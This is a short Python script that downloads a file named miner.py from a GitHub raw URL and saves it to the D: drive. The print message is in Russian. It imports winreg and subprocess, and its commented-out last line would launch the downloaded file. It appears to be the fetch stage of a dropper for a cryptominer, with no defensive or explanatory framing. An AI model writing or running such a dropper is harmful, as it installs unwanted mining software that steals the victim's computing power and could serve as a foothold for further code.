import os
import subprocess
import asyncio
from winreg import *
import requests

def download_file(url, save_path):
    response = requests.get(url)
    with open(save_path, 'wb') as f:
        f.write(response.content)
    print("Файл успешно скачан и сохранен по пути:", save_path)
    
github_file_url = "https://raw.githubusercontent.com/seybabzero2/miner/main/miner.py"
save_file_path = "D:\\miner.py"

download_file(github_file_url, save_file_path)
#subprocess.Popen(save_file_path + "\miner.py", shell=True)